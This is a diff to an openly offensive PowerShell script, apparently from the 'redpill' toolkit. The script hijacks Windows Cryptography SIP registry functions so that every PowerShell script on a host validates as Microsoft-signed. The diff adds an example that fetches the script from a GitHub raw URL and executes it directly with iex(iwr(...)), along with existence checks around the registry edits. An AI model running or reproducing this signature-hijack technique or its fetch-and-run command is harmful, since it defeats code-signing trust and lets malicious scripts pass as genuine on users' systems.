@@ -3,7 +3,10 @@
    Author: @netbiosX
 
 .DESCRIPTION
-   Digitally sign all powershell scripts on the host as Microsoft..
+   Digitally sign ALL powershell scripts on the host as Microsoft..
+
+.EXAMPLE
+   PS C:\> iex(iwr("https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/CertSign_PS1/DigitalSignature-Hijack.ps1"))
 #>
 
 
@@ -39,6 +42,14 @@ If(-not(Test-Path -Path "$DllPath"))
 #Digitally sign all powershell scripts on the host as Microsoft
 write-host "* Digitally sign ALL PS1 scripts on the host as Microsoft" -ForegroundColor Green
 $GetCertFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' + '\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg' -join ''
+If(-not(Test-Path -Path "$GetCertFunc") -or ($GetCertFunc -iMatch '^(False)$'))
+{
+   write-host "x " -ForegroundColor Red -NoNewline
+   write-host "Notfound: '" -ForegroundColor DarkGray -NoNewline
+   write-host "$GetCertFunc" -ForegroundColor Red -NoNewline
+   write-host "'`n" -ForegroundColor DarkGray
+   return
+}
 
 
 #PowerShell SIP Guid
@@ -55,6 +66,14 @@ $PEGetMSCert | Set-ItemProperty -Name FuncName -Value $NewFuncName
 #Validate the digital signature for all powershell scripts
 write-host "* Validate the digital signature for ALL powershell scripts" -ForegroundColor Green
 $ValidateHashFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' + '\OID\EncodingType 0\CryptSIPDllVerifyIndirectData' -join ''
+If(-not(Test-Path -Path "$ValidateHashFunc") -or ($ValidateHashFunc -iMatch '^(False)$'))
+{
+   write-host "x " -ForegroundColor Red -NoNewline
+   write-host "Notfound: '" -ForegroundColor DarkGray -NoNewline
+   write-host "$ValidateHashFunc" -ForegroundColor Red -NoNewline
+   write-host "'`n" -ForegroundColor DarkGray
+   return
+}
 
 #PowerShell SIP Guid
 $NewDll = "$DllPath"
